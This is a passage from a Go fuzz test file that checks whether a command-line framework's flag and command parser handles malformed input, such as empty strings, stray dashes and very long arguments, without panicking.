			t.Errorf("Input exceeding MaxArgLength (%d) not rejected: length=%d",
				config.MaxArgLength, len(input))
		}
	})
}

// =============================================================================
// FUZZ TEST 3: COMMAND PARSING ROBUSTNESS (MEDIUM PRIORITY)
// =============================================================================

// FuzzCommandParsing tests the robustness of command and flag parsing.
//
// SECURITY CRITICALITY: ★★★☆☆ (MEDIUM)
//
// While command parsing is less security-critical than path and input validation,
// it's still important to ensure it never crashes and handles malformed inputs gracefully.
// This prevents denial of service and ensures predictable error messages for users.
//
// ATTACK SURFACE ANALYZED:
// 1. Malformed flag syntax: --flag=, --=value, --, ---flag
// 2. Missing flag values: --flag without argument
// 3. Duplicate flags: --flag value1 --flag value2
// 4. Empty arguments: "", multiple empty strings
// 5. Very long argument lists: 1000+ arguments
// 6. Special flag names: --, -help, --help=--help
//
// SECURITY INVARIANTS:
// 1. NEVER panic on any argument array
// 2. NEVER cause infinite loops or hangs
// 3. Provide clear error messages for malformed input
// 4. Handle empty args array gracefully
// 5. Reject obviously malformed flag syntax consistently
func FuzzCommandParsing(f *testing.F) {
	// Seed corpus with valid command patterns
	f.Add("start")
	f.Add("stop")
	f.Add("--flag value")
	f.Add("-f value")
	f.Add("command --flag=value")
	f.Add("cmd sub1 sub2 --flag")

	// Seed corpus with malformed patterns
	f.Add("")
	f.Add("--")
	f.Add("---")
	f.Add("--flag=")
	f.Add("--=value")
	f.Add("-" + strings.Repeat("a", 100))

	f.Fuzz(func(t *testing.T, argsStr string) {
		// Create a simple test app
		app := New("testapp")
		app.Command("test", "Test command", func(ctx *Context) error {
			return nil
		})

		// Parse the fuzzed string into arguments
		// Simple space-splitting for fuzzing purposes
		args := strings.Fields(argsStr)

		// CRITICAL: Must never panic
		// If it panics, the fuzzer will catch it as a failure
		_ = app.Run(args)

		// The function should handle any input gracefully
		// We don't check for specific errors, just that it doesn't crash
	})
}

// =============================================================================
// HELPER FUNCTIONS FOR FUZZ TESTING
// =============================================================================

// TODO: Add more helper functions if needed for corpus generation or validation
